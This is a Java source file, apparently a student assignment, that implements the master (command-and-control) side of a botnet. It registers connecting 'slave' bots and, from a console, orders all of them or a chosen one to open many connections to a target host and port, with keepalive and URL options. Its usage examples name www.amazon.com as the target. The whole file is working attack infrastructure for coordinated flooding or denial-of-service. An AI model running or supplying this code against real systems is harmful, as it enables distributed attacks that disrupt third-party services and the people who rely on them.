/* Created by Mengtong Ma ID: 011483056 */

import java.io.*;
import java.net.*;
import java.util.*;
import java.text.*;

public class MasterBot{


	public static void main(String args[]) throws IOException{
		if(args.length == 2 && 
		   args[0].equals("-p") &&  // command line argument "p"
 		   Integer.parseInt(args[1]) > 0 && Integer.parseInt(args[1]) < 65536 ){ // 0 < port number < 65536

 		   	ServerSocket serverSocket = new ServerSocket(Integer.parseInt(args[1]));
 		    System.out.println("Ready for connection...");

 		    CommandThread commandThread = new CommandThread();
 		    commandThread.start();

 		    while(true){ 
 		    	// Slave connect to master
 		    	Socket socket = serverSocket.accept();
 		    	ServerThread serverThread = new ServerThread(socket);
 		    	serverThread.start();
 		    }
		}
		else{

			System.out.println("Usage: MasterBot -p PortNumber"); 
		}
	}


}

// Store Slave List in a LinkedList
class slaveList{
    public static List<Socket> sList = Collections.synchronizedList(new LinkedList<>());
    public static List<String> registerDate = Collections.synchronizedList(new LinkedList<>());
    public int count = 0;

    slaveList() {}
}

// Add new salve to the slave list
	class ServerThread extends Thread{
		Socket socket;
		Date dNow = new Date();
		SimpleDateFormat ft = new SimpleDateFormat("YYYY-MM-dd");
		ServerThread(Socket socket){
			this.socket = socket;
		}
		public void run(){
			synchronized(slaveList.sList){
				slaveList.sList.add(socket);
			}
			synchronized(slaveList.registerDate){
				slaveList.registerDate.add(ft.format(dNow).toString());
			}				
		}
	}

// thread to implement command line

	class CommandThread extends Thread{

		private Socket socket;
		private boolean flag = true;
		private String targetIp;
		private int targetPort; 
		private int numberOfConnections;

		public void run(){
			while(flag){
			try{
				System.out.print(">");
				BufferedReader commandInput = new BufferedReader(new InputStreamReader(System.in));
				String commandLine = commandInput.readLine();
				String[] commandString;
				commandString = commandLine.split(" ");

				if(commandString[0].equals("list")){
					cmdList();
				}

				else if(commandString[0].equals("connect")){
					cmdConnect(commandString);
					
				}
				else if(commandString[0].equals("disconnect")){
					cmdDisconnect(commandString);
				}
				else if(commandString[0].equals("shut") && commandString[1].equals("down")){
					flag = false;
					System.exit(-1);
				}
				else{

					System.out.println("Invaild input!");
				}

			}catch (IOException e){
					e.printStackTrace();
				}
			}

		}

		// list all current slaves
			private void cmdList(){
			Socket slave;
			if(slaveList.sList.size() == 0){
				System.out.println("There is no Slave connected to the Master.");
			}
			else{

				for(int i = 0; i < slaveList.sList.size(); i++){
					slave = slaveList.sList.get(i);
					System.out.println(slave.getInetAddress().getHostName() + " " 
						+ slave.getInetAddress().getHostAddress() + " " + slave.getPort() 
						+ " " + slaveList.registerDate.get(i));
					System.out.flush();
				}
			}
		}

		// Establish a number of connections to the target host.
			private void cmdConnect(String[] commandString){
				boolean isFound = false;
				if(commandString.length != 4 && commandString.length != 5 && commandString.length != 6){
					System.out.println("Invalid command!\n" + "Usage: conncet IPAddressOrHostNameOfYourSlave|all\n" 
						+ "TargetHostName|IPAddress TargetPortNumber NumberOfConnections");
					System.out.println("Example: connect all www.amazon.com 80 1");
				}
				else{
					  targetIp = commandString[2];
					  targetPort = Integer.parseInt(commandString[3]);
					  // if(commandString.length == 5){
					  // 	numberOfConnections = Integer.parseInt(commandString[4]);
					  // }
					  // else{
					  // 	numberOfConnections = 1;
					  // }
					  if(commandString.length == 4){
					  	numberOfConnections = 1;
					  }
					  else if(commandString.length == 5 && commandString[4].equals("keepalive")){
					  	numberOfConnections = 1;
					  }
					  else if(commandString.length == 5 && commandString[4].startsWith("url=")){
					  	numberOfConnections = 1;
					  }
					  else{
					  	numberOfConnections = Integer.parseInt(commandString[4]);
					  }
					  
						for(int i = 0; i < slaveList.sList.size(); i++){

							Socket eachSocket = slaveList.sList.get(i);
								
							if(commandString[1].equals("all") || 
								eachSocket.getInetAddress().getHostAddress().equals(commandString[1])||
								eachSocket.getInetAddress().getHostName().equals(commandString[1])){
									isFound = true;
									try{
										OutputStream os = eachSocket.getOutputStream();
										PrintWriter pw = new PrintWriter(os, true);
										String outMessage = commandString[0] + " " + targetIp + " " + targetPort + " " + Integer.toString(numberOfConnections);
										if( ( commandString.length == 6 && commandString[5].equals("keepalive") ) 
											|| (commandString.length == 5 && commandString[4].equals("keepalive")) ){
											outMessage += " keepalive";
										}
										else if( commandString.length == 5 && commandString[4].startsWith("url=")){
											outMessage += " " + commandString[4];
										}
										else if(commandString.length == 6 && commandString[5].startsWith("url=")){
											outMessage += " " + commandString[5]; 
										}
										pw.println(outMessage);
									}catch (IOException e){
										System.err.println("Failed...");
										//System.exit(-1);
									} 
							}  
						}
						if(isFound == false){
							System.out.println("Can not find the SlaveBot at " + commandString[1]);
						}						
					}

				}
				
				// Close a number of connections to a given host
			private void cmdDisconnect(String[] commandString){
					//System.out.println("disconnect");
				boolean isFound = false;
				String disTargetPort = "all";
				if(commandString.length != 3 && commandString.length != 4){
					System.out.println("Invalid command!\n" + "Usage: disconncet IPAddressOrHostNameOfYourSlave|all\n" 
						+ "TargetHostName|IPAddress TargetPort");
					System.out.println("Example: disconnect all www.amazon.com 80");
				}
				else{

					targetIp = commandString[2];
					if(commandString.length == 4){
						targetPort = Integer.parseInt(commandString[3]);
					}

					for(int i = 0; i < slaveList.sList.size(); i++){

						Socket everySocket = slaveList.sList.get(i);
						if(commandString[1].equals("all") || 
						    everySocket.getInetAddress().getHostAddress().equals(commandString[1])||
							everySocket.getInetAddress().getHostName().equals(commandString[1])){

								isFound = true;
								try{
									OutputStream os = everySocket.getOutputStream();
									PrintWriter pw = new PrintWriter(os, true);
									String outMessage = "";
									if(commandString.length == 3){
										outMessage = commandString[0] + " " + targetIp + " " + disTargetPort;
									}
									else{
										outMessage = commandString[0] + " " + targetIp + " " + Integer.toString(targetPort); 
									}
									pw.println(outMessage);
								}catch (IOException e){
									e.printStackTrace();
									System.exit(-1);
								}

							}
					}
					if(isFound == false){
						System.out.println("Can not find the SlaveBot at " + commandString[1]);
					}

				}

			}

								
	}



